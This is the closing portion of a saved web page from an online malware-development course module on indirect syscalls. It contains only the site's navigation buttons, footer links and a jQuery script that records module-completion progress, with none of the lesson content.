        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/88"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/89/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/89/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/90"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Indirect%20Syscalls%20-%20HellsHall_files/jquery-3.6.0.min.js"></script>
        <script src="Indirect%20Syscalls%20-%20HellsHall_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Indirect%20Syscalls%20-%20HellsHall_files/app.4474f4d1.css"><link rel="modulepreload" href="Indirect%20Syscalls%20-%20HellsHall_files/app.5f3af5ce.js"><link rel="stylesheet" href="Indirect%20Syscalls%20-%20HellsHall_files/app.4474f4d1.css"><script type="module" src="Indirect%20Syscalls%20-%20HellsHall_files/app.5f3af5ce.js"></script><script src="Indirect%20Syscalls%20-%20HellsHall_files/navbar.js"></script>
<script src="Indirect%20Syscalls%20-%20HellsHall_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 89;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>